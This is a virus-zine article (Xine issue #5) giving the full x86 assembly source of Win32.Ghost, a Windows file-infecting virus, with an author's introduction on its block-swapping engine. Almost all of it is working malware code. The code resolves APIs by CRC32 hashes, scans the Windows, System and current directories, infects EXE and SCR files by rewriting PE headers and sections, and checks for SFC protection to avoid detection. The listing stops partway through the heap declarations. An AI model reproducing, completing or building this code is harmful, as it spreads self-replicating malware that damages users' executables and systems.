
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 202 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ




   ;
   ;ÄÄÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄ¿
   ; ÚÄÜÜÜÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ        [ Win32.Ghost      Billy Belcebu/iKX ]
   ; ÀÄÛÛÛÄÛÛÛÛÛÛÄÄÄÛÛÛÛÛÄÄ¿ ÚÄÄÄÄÄÄ[ 1731 bytes    Target - Win32 Ring3 ]ÄÄÄÄÄÄ
   ; ÚÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ ³      [ 09/05/00 - Made in Valencia, Spain ]
   ; ÀÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÄÄÙ
   ;
   ;
   ;
   ; [ Introduction ]
   ;
   ; Welcome to Ghost, the new  creation of Billy Belcebu (me!). Well, if you've
   ; read my 'Metamorphism Essay - Part II', i've just made a virus with a block
   ; swapping engine :) It's not  a new technique in  virus  coding, but i think
   ; it's the first time someone tries it in  Win32 viruses. Just a coding exer-
   ; cise, a previous step before  getting into the real metamorphism... step by
   ; step guys... i don't like  the pressure :) Well... this virus  is done very
   ; quickly, in much less time than all my other  viruses (except Win9x.Molly),
   ; because it taken  me 3 days to  make the whole thing... coding 1 or 2 hours
   ; per day. It isn't supposed to be the best virus on earth,but what the fuck,
   ; it's a virus, and it's written by me, so i am proud of it :)
   ;
   ; [ How it works? ]
   ;
   ; Well, let's imagine that this is the virus in its first generation:
   ;
   ;       A-BCDEFGHIJ-K ÄÄ virus
   ;
   ; The A and the K can't  be changed from  its place, because we need at least
   ; some routines  with a  fixed address (A) and  the  data  always in the same
   ; place (K).
   ;
   ; So if we pass the virus  through the BSE (Block Swapping Engine), we'll get
   ; all yhe routines with its  address changed. Let's see  it with  a graphical
   ; example:
   ;
   ;       A-BCDEFGHIJ-K ÄÄ[ BSE ]ÄÄ A-GBCFJEIDH-K
   ;
   ; For achieve  this goal  we have  an  structure with some references to each
   ; routine, called RIT (Routine Info Table), that  has an ID for each routine,
   ; and it's size. It's enough information for handle  all properly. Also, as i
   ; have  said  before we  have a BSE routine for process the RIT, and swap the
   ; routines randomly.
   ;
   ; It's not metamorphism, but it's cool anyway :)
   ;
   ; [ Features ]
   ;
   ;       + Block Swapping features included
   ;       + Some Win2k specific code (uses SFP)
   ;       + Infects EXE/SCR PE files
   ;       + Overwrites .reloc sections if present (renames .reloc to .ghost)
   ;       + Get's API addresses using only its CRC32
   ;
   ; [ Why this name? ]
   ;
   ; Ok, the question present  in all viruses :) It's because  the last album of
   ; the  german  power metal  band Rage, called  Ghosts. It's the soundtrack of
   ; this virus. Specially i like the ballad 'Love and fear unite'...
   ;
   ; [ Greetings ]
   ;
   ; To all the iKX family, specially  to StarZer0 and  Asmodeus for  the  moral
   ; support they gave me  in my  worse moments, and for  pushing me  to keep on
   ; coding. Also to my friends  in the VX  scene, and also  my  friend  of real
   ; life RunAwayColt (Potro Desbocado), for being there and helping me.
   ;
   ; (c) 2000 Billy Belcebu/iKX               [ http://beautifulpeople.cjb.net ]

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Win32.Ghost                                  (c) 2000 Billy Belcebu/iKX |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

           .586p
           .model  flat,stdcall

   extrn   ExitProcess:PROC
   extrn   MessageBoxA:PROC

           .data

   szTtl   db      "Win32.Ghost",0
   szMsg   db      "First Generation Host",10,13
           db      "(c) 2000 Billy Belcebu/iKX",0

   virus_size      =       virus_end-virus_start
   heap_size       =       heap_end-heap_start
   total_size      =       virus_size+heap_size

   PUSHAD_EDI      =       00h
   PUSHAD_ESI      =       04h
   PUSHAD_EBP      =       08h
   PUSHAD_ESP      =       0Ch
   PUSHAD_EBX      =       10h
   PUSHAD_EDX      =       14h
   PUSHAD_ECX      =       18h
   PUSHAD_EAX      =       1Ch

   MAX_PATH        =       104h

   sign            =       00h
   InfectPE        =       01h
   CheckImageBase  =       02h
   GetAPIs         =       03h
   GetAPI_ET_CRC32 =       04h
   CRC32           =       05h
   InfectDir       =       06h
   ProcessExtension=       07h
   random          =       08h
   r_range         =       09h
   bse             =       0Ah

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Routine Info Table handling stuff                                       |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   rit     struc
   r_id    db      ?
   r_size  dw      ?
   rit     ends

   rit_size =      size rit

   rout    macro   routine_id,routine_start,routine_end
           db      routine_id
           dw      offset routine_end-offset routine_start
           endm

   callr   macro   routine_id
           push    routine_id
           call    dword ptr [ebp+call_rit]
           endm

   apicall macro   api2call
           call    dword ptr [ebp+api2call]
           endm

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | The virus code itself :P                                                |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

           .code

   virus_start     =       $

   host:
   ;       int     3
           push    eax
           pushad

           call    kaka
   kaka:   pop     ebp
           sub     ebp,offset kaka

           lea     eax,[ebp+call_rit_routine]
           mov     dword ptr [ebp+call_rit],eax

           push    05h                             ; ECX is the limit of pages
           pop     ecx
           call    $+5                             ; We put a page inside our code
           pop     esi
           callr   CheckImageBase                  ; Get our own image base
           mov     dword ptr [ebp+ModBase],esi

           push    05h                             ; 50 pages to scan
           pop     ecx
           mov     esi,[esp.24h]                   ; Put the candidate to kernel
           callr   CheckImageBase                  ; Scan backwards for it
           mov     dword ptr [ebp+kernel],esi

   ;       lea     eax,[ebp+api_list]              ; Let's detect all the needed
           xchg    eax,esi                         ; APIs :)
           lea     edi,[ebp+api_addresses]
           callr   GetAPIs

   ; Let's mix the blocks :)

           push    80000                           ; Alloc lotsa memory...
           push    00h                             ; Better too much than not
           apicall GlobalAlloc                     ; enough :)
           mov     dword ptr [ebp+buffer],eax

   ; The memory is done like this table:
   ;       +-----------------------+
   ;       | Copy of RIT structure |
   ;       +-----------------------+
   ;       |   New RIT structure   |
   ;       +-----------------------+
   ;       |                       |
   ;       |    Swapped blocks     |
   ;       |                       |
   ;       +-----------------------+

           xchg    eax,edi                         ; Make a copy of the original
           lea     esi,[ebp+routine_info_table]    ; RIT in memory (for let BSE
           push    n_routines*rit_size             ; to handle it)
           pop     ecx
           rep     movsb
           mov     dword ptr [ebp+new_rit],edi     ; Save offset where we'll put
           mov     dword ptr [ebp+new_rit_mem],edi ; the new generated RIT
           add     edi,n_routines*rit_size
           mov     dword ptr [ebp+swapped_blocks],edi ; Save offset where we'll
           mov     dword ptr [ebp+swapped_blocks_mem],edi ; put swapped blocks :)

           callr   bse                             ; Call our BSE

           push    dword ptr [ebp+OldEIP]          ; Restore this interesting
           push    dword ptr [ebp+ModBase]         ; info

   ; Infect some files in Windows, System and current directories

           lea     edi,[ebp+current_dir]           ; Save current directory to
           push    edi                             ; a temp variable
           push    MAX_PATH
           apicall GetCurrentDirectoryA

           lea     edi,[ebp+infect_dir]
           push    MAX_PATH
           push    edi
           apicall GetWindowsDirectoryA
           callr   InfectDir

           lea     edi,[ebp+infect_dir]
           push    MAX_PATH
           push    edi
           apicall GetSystemDirectoryA
           callr   InfectDir

           lea     edi,[ebp+current_dir]
           callr   InfectDir

           pop     dword ptr [ebp+ModBase]
           pop     dword ptr [ebp+OldEIP]

           mov     eax,00400000h
   ModBase =       $-4
           add     eax,offset first_gen_host-400000h
   OldEIP  =       $-4
           mov     [esp.20h],eax
           popad
           ret

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Routine for call to swapped routines (dinamically)                      |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   ; A bit weird, but w0rkz :)

   call_rit_routine:
           pushad
           xor     eax,eax
           mov     ebx,[esp.24h]                   ; Get routine_id :)
           push    dword ptr [esp.20h]             ; Fix some stack things for
           pop     dword ptr [esp.24h]             ; be able to return...
           push    n_routines                      ; ECX = n of entries of RIT
           pop     ecx
           lea     edx,[ebp+swap_routines]         ; EDX = Ptr to swappable routines
           lea     esi,[ebp+routine_info_table]    ; ESI = Ptr to RIT
   crr_loop:
           lodsb                                   ; Load id of routine
           cmp     al,bl                           ; Compare them
           jz      w3g0t1t
           lodsw
           add     edx,eax
           loop    crr_loop
   w3g0t1t:
           mov     dword ptr [ebp+addr2call],edx
           popad

           mov     [esp],12345678h
   addr2call =     $-4
           ret

   ; ===( Swappable routines )==================================================

   swap_routines   =       $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Virus signature :P                                                      |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   signature:
           db      00h,"Win32.Ghost (c) 2000 Billy Belcebu/iKX",00h
   signature_end = $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Routine for mix the blocks                                              |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   block_swapping_engine:
           mov     byte ptr [ebp+rout_counter],n_routines
   thereisnoloveforme:
           mov     esi,dword ptr [ebp+buffer]
           mov     edi,dword ptr [ebp+new_rit]
   get_another_rit_entry:
           push    n_routines
           pop     eax
           callr   r_range
           mov     ebx,eax                         ; EBX = its place in RIT struc
           imul    eax,eax,03h                     ; Get a random block
           add     eax,esi                         ; EAX = Address of RIT entry
           cmp     word ptr [eax],00h
           jz      get_another_rit_entry

           xchg    eax,esi
           movsb                                   ; Copy the RIT entry into
           movzx   ecx,word ptr [esi]
           movsw                                   ; the new RIT structure
           mov     edi,esi
           sub     edi,3
           xor     eax,eax
           stosw                                   ; Nulify that entry
           stosb
           cdq

           lea     esi,[ebp+routine_info_table]
           xchg    ecx,ebx
           jecxz   over_build_offs
   build_offset:
           lodsb
           lodsw
           add     edx,eax
           loop    build_offset

   over_build_offs:                                  ; EDX = Offset of the code
           lea     esi,dword ptr [ebp+swap_routines] ;     of the RIT entry
           add     esi,edx
           mov     edi,dword ptr [ebp+swapped_blocks]
           mov     ecx,ebx
           rep     movsb
           add     dword ptr [ebp+swapped_blocks],ebx ; Ptr to next routine

           add     dword ptr [ebp+new_rit],3         ; Ptr to next block

           dec     byte ptr [ebp+rout_counter]
           jnz     thereisnoloveforme
           ret
   end_block_swapping_engine = $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Search files by wildcards (Ring-3 runtime method)                       |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   SetNewDir&InfectFilesInDirectory:
           mov     dword ptr [ebp+temp_esp],esp
           push    edi
           apicall SetCurrentDirectoryA
   InfectFilesInDirectory:
           lea     eax,[ebp+WIN32_FIND_DATA]       ; Search for files
           push    eax
           call    omask
           db      "*.*",0
   omask:  apicall FindFirstFileA

           inc     eax
           jz      FailOccured
           dec     eax

           mov     dword ptr [ebp+SearchHandle],eax

   SearchForMore:
           lea     edi,[ebp+WFD_szFileName]        ; Is the file found factible
           push    edi                             ; of being infected?
           callr   ProcessExtension
           jecxz   NotThisTime                     ; Nopes.

           callr   InfectPE                        ; It's a PE executable

   NotThisTime:
           lea     edi,[ebp.WIN32_FIND_DATA]       ; Fill this with zeroes
           mov     ecx,WFD_Size
       xor     al,al
           push    edi
           rep     stosb                           ; Search for more filez :)
           push    dword ptr [ebp+SearchHandle]
           apicall FindNextFileA

           or      eax,eax
           jnz     SearchForMore

   CloseSearchHandle:
           push    dword ptr [ebp+SearchHandle]
           apicall FindClose
   FailOccured:
           mov     esp,dword ptr [ebp+temp_esp]
           ret
   EndSetNewDir&InfectFilesInDirectory = $

   ProcessExtension_:
   ; input:
   ;       EDI - Pointer to file name
   ; output:
   ;       ECX - 00 - Error: not handled extension
   ;             01 - Possible PE file

           push    edi
           xor     ecx,ecx                         ; Clear ECX

           mov     al,"."                          ; Search for da point
           scasb
           jnz     $-1
           mov     eax,[edi]                       ; Get the extension

           or      eax,00202020h                   ; Make it lowercase
           cmp     eax,"exe"                       ; EXE?
           jz      MaybePE
           cmp     eax,"rcs"                       ; SCR?
           jnz     NotHandledExtension
   MaybePE:inc     ecx
   NotHandledExtension:
           pop     edi
           ret
   EndProcessExtension = $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Infect PE                                                               |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   InfectPEfile:
           cmp     dword ptr [ebp+SfcIsFileProtected],00h
           jz      NotInWin2k

           push    edi                             ; See if file is protected
           push    00h                             ; with SFC functions
           apicall SfcIsFileProtected

           or      eax,eax                         ; If so, don't infect
           jnz     ExitInfectPE

   NotInWin2k:
           push    80h                             ; Destroy hostile attributes
           push    edi
           apicall SetFileAttributesA

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitInfectPE
           dec     eax

           mov     dword ptr [ebp+FileHandle],eax  ; Save handle of opened file

           push    eax

           push    00h
           push    eax
           apicall GetFileSize                     ; Get its size
           pop     ecx
           add     eax,total_size

           push    eax

           xor     ebx,ebx                         ; EBX = 0
           push    ebx
           push    eax                             ; push size
           push    ebx
           push    04h
           push    ebx
           push    ecx                             ; push handle
           apicall CreateFileMappingA

           pop     ecx                             ; ECX = Size to map

           test    eax,eax
           jz      CloseFileExitInfectPE

           mov     dword ptr [ebp+MapHandle],eax

           xor     ebx,ebx
       push    ecx
           push    ebx
           push    ebx
           push    02h
           push    eax
           apicall MapViewOfFile

           test    eax,eax
           jz      UnMap&CloseMap&FileExitInfectPE

           mov     dword ptr [ebp+MapAddress],eax

           mov     esi,[eax+3Ch]
           add     esi,eax

           cmp     word ptr [esi],"EP"
           jnz     UnMap&CloseMap&FileExitInfectPE

           cmp     dword ptr [esi+4Ch],"EGAR"
           jz      UnMap&CloseMap&FileExitInfectPE

           and     dword ptr [esi+58h],00h

           mov     dword ptr [esi+4Ch],"EGAR"

       mov     edi,esi

       movzx   eax,word ptr [edi+06h]
       dec     eax
       imul    eax,eax,28h
       add     esi,eax
       add     esi,78h
       mov     edx,[edi+74h]
       shl     edx,03h
           add     esi,edx                         ; ESI = Last section header
                                                   ; EDI = PE header

           or      [esi+24h],0A0000020h            ; New section attributes

           and     dword ptr [edi+0A0h],00h        ; Nulify fixups
           and     dword ptr [edi+0A4h],00h

           cmp     dword ptr [esi],"ler."
           jnz     RelocNotLast
           cmp     dword ptr [esi+4],"co"
           jnz     RelocNotLast

   ; Overwriting stage, .reloc is last section

           mov     dword ptr [esi],"ohg."          ; Set new section name to
           mov     dword ptr [esi+4],"ts"          ; ".ghost"

           and     dword ptr [esi+18h],00h         ; Clear PointerToRelocations
           and     word ptr [esi+20h],00h          ; Clear NumberOfRelocations

           push    dword ptr [esi+14h]             ; Where copy virus

           mov     eax,virus_size
           mov     [esi+08h],eax                   ; VirtualSize -> virus size
           mov     ecx,[edi+3Ch]                   ; ECX = Alignment

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi+10h],eax                   ; SizeOfRawData -> aligned
                                                   ;                  virus size

           mov     eax,[esi+10h]                   ; Fix ImageSize to allow it
           add     eax,[esi+0Ch]                   ; to work in NT :P
           mov     [edi+50h],eax

           mov     eax,[esi+0Ch]                   ; New EIP
           xchg    eax,[edi+28h]                   ; Put new EIP and get old one
           mov     dword ptr [ebp+OldEIP],eax      ; Save it

           pushad

           mov     eax,[esi+14h]                   ; EDX = Where truncate
           add     eax,[esi+10h]
           mov     ecx,[edi+3Ch]

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esp.PUSHAD_EDX],eax

           popad

           pop     edi
           jmp     copy_virus

   ; Normal stage, .reloc not last or not present

   RelocNotLast:
           mov     edx,[esi+10h]
           mov     ebx,edx
           add     edx,[esi+14h]

           push    edx

           mov     eax,ebx
           add     eax,[esi+0Ch]
           xchg    [edi+28h],eax                   ; Put new EIP
           mov     dword ptr [ebp+OldEIP],eax

           mov     eax,[esi+10h]
           add     eax,virus_size
           mov     ecx,[edi+3Ch]

           cdq                                     ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx

           mov     [esi+10h],eax
           mov     [esi+08h],eax
           xchg    eax,edx

           mov     eax,[esi+10h]
           add     eax,[esi+0Ch]
           mov     [edi+50h],eax

           add     edx,[esi+14h]

           pop     edi

   copy_virus:
           lea     esi,[ebp+virus_start]           ; Copy fixed part of virus
           add     edi,dword ptr [ebp+MapAddress]
           mov     ecx,(virus_size-(virus_end-swap_routines))
           rep     movsb

           mov     esi,dword ptr [ebp+swapped_blocks_mem] ; Copy swapped part
           mov     ecx,end_swap_routines-swap_routines
           rep     movsb

           mov     esi,dword ptr [ebp+new_rit_mem] ; Copy new RIT
           mov     ecx,n_routines*3
           rep     movsb

   Trunc&UnMap&CloseMap&FileExitInfectPE:
           xor     eax,eax
           push    eax
           push    eax
           push    edx
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    dword ptr [ebp+FileHandle]
           apicall SetEndOfFile

   UnMap&CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+MapAddress]
           apicall UnmapViewOfFile

   CloseMap&FileExitInfectPE:
           push    dword ptr [ebp+MapHandle]
           apicall CloseHandle

   CloseFileExitInfectPE:
           push    dword ptr [ebp+FileHandle]
           apicall CloseHandle

   ExitInfectPE:
           ret
   EndInfectPE = $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Miscellaneous routines                                                  |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   CheckImageBase_:
   ; input:
   ;       ESI - Address inside module
   ;       ECX - Limit
   ; output:
   ;       ESI - module address

           and     esi,0FFFF0000h
           cmp     word ptr [esi],"ZM"
           jz      ItWasKewlEnough
   NotCoolAddress:
           sub     esi,00010000h
           loop    CheckImageBase_
   ItWasKewlEnough:
           ret
   EndCheckImageBase = $

   CRC32_:
   ; input:
   ;       ESI - Pointer to the code to process
   ;       EDI - Size of such code
   ; output:
   ;       EAX - CRC32 of that code

       cld
           pushad
       xor     ecx,ecx                         ; Optimized by me - 2 bytes
       dec     ecx                             ; less
       mov     edx,ecx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:  dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
       dec     edi                             ; Another fool byte less
       jnz     NextByteCRC
       not     edx
       not     ecx
           xchg    eax,edx                         ; Another byte less
       rol     eax,16
       mov     ax,cx
           mov     [esp.PUSHAD_EAX],eax
           popad
       ret
   EndCRC32 = $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | APICRC32 engine                                                         |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   ; The pseudo-structure for the APICRC32 engine is the following:
   ;
   ;       * ASCIIz String of the library (not needed for KERNEL32)
   ;       * CRC32 of APIs we need
   ;       * BB byte (for signalize the end of exports needed of that function)
   ;       * ... (repeat the above points the times you need->libraries u use)
   ;       * "" byte (for signalize the definitive end of imports)

   GetAPIs_:
           call    oAPI

   @FindFirstFileA         dd      0AE17EBEFh
   @FindNextFileA          dd      0AA700106h
   @FindClose              dd      0C200BE21h
   @CreateFileA            dd      08C892DDFh
   @DeleteFileA            dd      0DE256FDEh
   @SetFilePointer         dd      085859D42h
   @SetFileAttributesA     dd      03C19E536h
   @CloseHandle            dd      068624A9Dh
   @GetCurrentDirectoryA   dd      0EBC6C18Bh
   @SetCurrentDirectoryA   dd      0B2DBD7DCh
   @GetWindowsDirectoryA   dd      0FE248274h
   @GetSystemDirectoryA    dd      0593AE7CEh
   @CreateFileMappingA     dd      096B2D96Ch
   @MapViewOfFile          dd      0797B49ECh
   @UnmapViewOfFile        dd      094524B42h
   @SetEndOfFile           dd      059994ED6h
   @GetFileSize            dd      0EF7D811Bh
   @GlobalAlloc            dd      083A353C3h
   @GlobalFree             dd      05CDF6B6Ah
   @LoadLibraryA           dd      04134D1ADh
   @FreeLibrary            dd      0AFDF191Fh
   @GetTickCount           dd      0613FD7BAh
                           db      0BBh

                           db      "SFC",0
   @SfcIsFileProtected     dd      06DE8F7ABh
                           db      0BBh
                           db      ""

   oAPI:   pop     esi

   GetAPIs__:
   ; input:
   ;       EAX - Base address of the library where search the APIs
   ;       ESI - Pointer to an array of CRC32 of the APIs we want to search
   ;       EDI - Pointer to where store the APIs
   ; output:
   ;       Nothing.

       push    eax                             ; EAX = Handle of module
           pop     dword ptr [ebp+TmpModuleBase]
   APIS33K:
       lodsd                                   ; Get in EAX the CRC32 of API
           push    esi edi
           callr   GetAPI_ET_CRC32
           pop     edi esi
       stosd                                   ; Save in [EDI] the API address

           cmp     byte ptr [esi],0BBh             ; There are more APIs in this
           jnz     APIS33K                         ; library

           inc     esi                             ; Check if it's the last of
           cmp     byte ptr [esi],""              ; all them
           jz      EndOfAPISearch

           push    esi                             ; ESI points now to the ASCIIz
           apicall LoadLibraryA                    ; string of a library... We
                                                   ; need to load it!
           push    eax

   nxtchr: lodsb                                   ; Reach the end of the lib
           test    al,al                           ; asciiz name
           jnz     nxtchr

           pop     eax
           jmp     GetAPIs__

   EndOfAPISearch:
           ret
   EndGetAPIs = $

   GetAPI_ET_CRC32_:
   ; input:
   ;       EAX - CRC32 of the API we want to know its address
   ; output:
   ;       EAX - API address, NULL if error

       xor     edx,edx

           pushad

           call    over_APICRC32_SEH
           mov     esp,[esp+08h]                   ; Set stack as before
           xor     eax,eax                         ; signalize the error
           jmp     Remove_APICRC32_SEH

   over_APICRC32_SEH:
           push    dword ptr fs:[edx]              ; Set new SEH frame
           mov     dword ptr fs:[edx],esp

       xchg    eax,edx                         ; Put CRC32 of da api in EDX
           mov     dword ptr [ebp+Counter],eax     ; Clear this field :)
           push    3Ch
           pop     esi
           add     esi,[ebp+TmpModuleBase]         ; Get PE header of module
       lodsw
           add     eax,[ebp+TmpModuleBase]         ; Normalize

           push    1Ch
           pop     esi
           add     esi,[eax+78h]                   ; Get a pointer to its edata
           add     esi,[ebp+TmpModuleBase]

           lea     edi,[ebp+AddressTableVA]        ; Pointer to the address table
       lodsd                                   ; Get AddressTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       stosd                                   ; And store in its variable

       lodsd                                   ; Get NameTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       push    eax                             ; Put it in stack
       stosd                                   ; Store in its variable

       lodsd                                   ; Get OrdinalTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       stosd                                   ; Store

       pop     esi                             ; ESI = NameTable VA

   @?_3:   lodsd                                   ; Get pointer to an API name
           push    esi                             ; Save again
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       xchg    edi,eax                         ; Store ptr in EDI
       mov     ebx,edi                         ; And in EBX

       push    edi                             ; Save EDI
           xor     al,al
           scasb
           jnz     $-1
       pop     esi                             ; ESI = Pointer to API Name

       sub     edi,ebx                         ; EDI = API Name size

       push    edx                             ; Save API's CRC32
           callr   CRC32                           ; Get actual api's CRC32
       pop     edx                             ; Restore API's CRC32
       cmp     edx,eax                         ; Are them equal?
       jz      @?_4                            ; if yes, we got it

       pop     esi                             ; Restore ptr to api name
           inc     dword ptr [ebp+Counter]         ; And increase the counter
       jmp     @?_3                            ; Get another api!
   @?_4:
       pop     esi                             ; Remove shit from stack
           mov     eax,dword ptr [ebp+Counter]     ; Put in EAX the number that
                                                   ; the API occupy in list.
       shl     eax,1                           ; *2 (it's an array of words)
           add     eax,[ebp+OrdinalTableVA]        ; Normalize
       xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
       lodsw                                   ; Get ordinal in AX
       cwde                                    ; Clear MSW of EAX
       shl     eax,2                           ; And with it we go to the
           add     eax,[ebp+AddressTableVA]        ; AddressTable (array of
       xchg    esi,eax                         ; dwords)
       lodsd                                   ; Get Address of API RVA
           add     eax,[ebp+TmpModuleBase]         ; and normalize!! That's it!

   Remove_APICRC32_SEH:
           xor     edx,edx                         ; Remove that SEH frame
           pop     dword ptr fs:[edx]
           pop     edx
           mov     [esp.PUSHAD_EAX],eax
           popad
       ret
   EndGetAPI_ET_CRC32 = $

   GetRandom:
   ; input:
   ;       Nothing.
   ; output:
   ;       EAX - Random number

           push    ebx edx
           apicall GetTickCount
           call    _seed
           dd      "RAGE"
   _seed:  pop     ebx
           xor     eax,[ebx]
           mov     [ebx],eax
           pop     edx ebx
           ret
   EndGetRandom = $

   GetRandomRange:
   ; input:
   ;       EAX - Range
   ; output:
   ;       EAX - Random number into that range

           push    ecx
           push    edx
           mov     ecx,eax
           callr   random
           xor     edx,edx
           div     ecx
           mov     eax,edx
           pop     edx
           pop     ecx
           ret
   EndGetRandomRange = $

   ; ===( End of swappable routines )===========================================

   end_swap_routines =     $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Routines table                                                          |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   routine_info_table:
           rout    sign,signature,signature_end
           rout    bse,block_swapping_engine,end_block_swapping_engine
           rout    InfectDir,SetNewDir&InfectFilesInDirectory,EndSetNewDir&InfectFilesInDirectory
           rout    ProcessExtension,ProcessExtension_,EndProcessExtension
           rout    InfectPE,InfectPEfile,EndInfectPE
           rout    CheckImageBase,CheckImageBase_,EndCheckImageBase
           rout    CRC32,CRC32_,EndCRC32
           rout    GetAPIs,GetAPIs_,EndGetAPIs
           rout    GetAPI_ET_CRC32,GetAPI_ET_CRC32_,EndGetAPI_ET_CRC32
           rout    random,GetRandom,EndGetRandom
           rout    r_range,GetRandomRange,EndGetRandomRange
   n_routines =    (($-routine_info_table)/rit_size)

   virus_end       =       $

   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
   ; | Data in the heap                                                        |
   ; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

   heap_start      =       $
   kernel          dd      ?
   TmpModuleBase   dd      ?
   AddressTableVA  dd      ?
   NameTableVA     dd      ?
   OrdinalTableVA  dd      ?
   Counter         dd      ?
   SearchHandle    dd      ?
   call_rit        dd      ?
   buffer          dd      ?
   new_rit         dd      ?
   new_rit_mem     dd      ?
   swapped_blocks  dd      ?
   swapped_blocks_mem dd   ?
   rout_counter    db      ?
   FileHandle      dd      ?
   MapHandle       dd      ?
   MapAddress      dd      ?
   temp_esp        dd      ?

   api_addresses   =       $
   FindFirstFileA          dd      ?
   FindNextFileA           dd      ?
   FindClose               dd      ?
   CreateFileA             dd      ?
   DeleteFileA             dd      ?
   SetFilePointer          dd      ?
   SetFileAttributesA      dd      ?
   CloseHandle             dd      ?
   GetCurrentDirectoryA    dd      ?
   SetCurrentDirectoryA    dd      ?
   GetWindowsDirectoryA    dd      ?
   GetSystemDirectoryA     dd      ?
   CreateFileMappingA      dd      ?
   MapViewOfFile           dd      ?
   UnmapViewOfFile         dd      ?
   SetEndOfFile            dd      ?
   GetFileSize             dd      ?
